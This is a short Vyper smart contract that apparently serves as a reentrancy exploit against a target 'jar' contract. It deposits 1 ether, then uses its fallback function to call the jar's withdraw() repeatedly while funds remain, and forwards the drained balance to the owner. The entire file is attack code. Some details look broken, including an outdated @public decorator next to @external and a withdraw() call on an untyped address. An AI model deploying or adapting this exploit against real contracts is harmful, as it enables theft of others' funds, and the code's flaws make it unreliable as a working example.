#pragma version >0.3.10

jar: public(address)
owner: address

@external
@payable
def __init__(_jar: address):
    assert msg.value >= as_wei_value(1, "ether")
    self.owner = msg.sender
    self.jar = _jar

@external
def prepare():
    send(self.jar, as_wei_value(1, "ether"))

@public
@payable
def __default__():
    if self.jar.balance > as_wei_value(1, "ether"):
       self.jar.withdraw()

@external
def get():
    send(self.owner, self.balance)
